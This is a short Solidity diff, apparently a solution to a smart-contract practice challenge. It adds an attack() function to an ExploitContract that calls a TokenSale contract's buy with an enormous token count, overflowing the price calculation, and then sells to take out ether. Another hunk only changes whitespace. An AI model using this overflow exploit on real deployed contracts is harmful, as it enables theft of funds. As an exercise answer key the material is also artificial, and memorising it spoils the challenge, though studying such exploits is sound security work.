@@ -28,7 +28,7 @@ contract TokenSale {
         require(balanceOf[msg.sender] >= numTokens);
 
         balanceOf[msg.sender] -= numTokens;
-        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
+        (bool ok,) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
         require(ok, "Transfer to msg.sender failed");
     }
 }
@@ -43,4 +43,9 @@ contract ExploitContract {
 
     receive() external payable {}
     // write your exploit functions below
+
+    function attack() public {
+        tokenSale.buy{value: 415992086870360064}(115792089237316195423570985008687907853269984665640564039458);
+        tokenSale.sell(1);
+    }
 }
